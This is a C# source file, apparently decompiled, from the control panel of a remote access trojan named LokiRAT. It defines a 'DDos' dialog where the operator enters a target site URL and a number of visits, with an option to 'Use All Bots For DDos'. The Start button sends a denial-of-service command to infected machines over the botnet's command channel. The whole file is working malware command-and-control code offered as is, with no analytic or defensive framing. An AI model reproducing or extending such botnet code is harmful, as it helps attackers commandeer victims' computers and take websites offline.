namespace LokiRAT_Client
{
    using LokiRAT_Server;
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Windows.Forms;

    public class ddos : Form
    {
        private Button button1;
        private CheckBox checkBox1;
        private IContainer components = null;
        private Label label1;
        private Label label2;
        private TextBox textBox1;
        private TextBox textBox2;

        public ddos()
        {
            this.InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string str = null;
            if (this.checkBox1.Checked)
            {
                str = "global";
            }
            main.sendToHost("type=" + str + "command&command=ldos|" + this.textBox1.Text + "|" + this.textBox2.Text);
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.button1 = new Button();
            this.textBox1 = new TextBox();
            this.textBox2 = new TextBox();
            this.label1 = new Label();
            this.label2 = new Label();
            this.checkBox1 = new CheckBox();
            base.SuspendLayout();
            this.button1.Location = new Point(0x99, 0x88);
            this.button1.Name = "button1";
            this.button1.Size = new Size(0x77, 0x1a);
            this.button1.TabIndex = 0;
            this.button1.Text = "Start";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new EventHandler(this.button1_Click);
            this.textBox1.Location = new Point(12, 0x19);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(260, 20);
            this.textBox1.TabIndex = 1;
            this.textBox1.Text = "http://www.google.com";
            this.textBox2.Location = new Point(12, 0x4a);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new Size(0x8e, 20);
            this.textBox2.TabIndex = 2;
            this.textBox2.Text = "1000";
            this.label1.AutoSize = true;
            this.label1.Location = new Point(12, 9);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x35, 13);
            this.label1.TabIndex = 3;
            this.label1.Text = "Site URL:";
            this.label2.AutoSize = true;
            this.label2.Location = new Point(9, 0x3a);
            this.label2.Name = "label2";
            this.label2.Size = new Size(0x4a, 13);
            this.label2.TabIndex = 4;
            this.label2.Text = "Number Visits:";
            this.checkBox1.AutoSize = true;
            this.checkBox1.Location = new Point(12, 0x6c);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new Size(0x83, 0x11);
            this.checkBox1.TabIndex = 5;
            this.checkBox1.Text = "Use All Bots For DDos";
            this.checkBox1.UseVisualStyleBackColor = true;
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x11c, 0xa8);
            base.Controls.Add(this.checkBox1);
            base.Controls.Add(this.label2);
            base.Controls.Add(this.label1);
            base.Controls.Add(this.textBox2);
            base.Controls.Add(this.textBox1);
            base.Controls.Add(this.button1);
            base.FormBorderStyle = FormBorderStyle.FixedDialog;
            base.Name = "ddos";
            this.Text = "DDos | LokiRAT";
            base.ResumeLayout(false);
            base.PerformLayout();
        }
    }
}

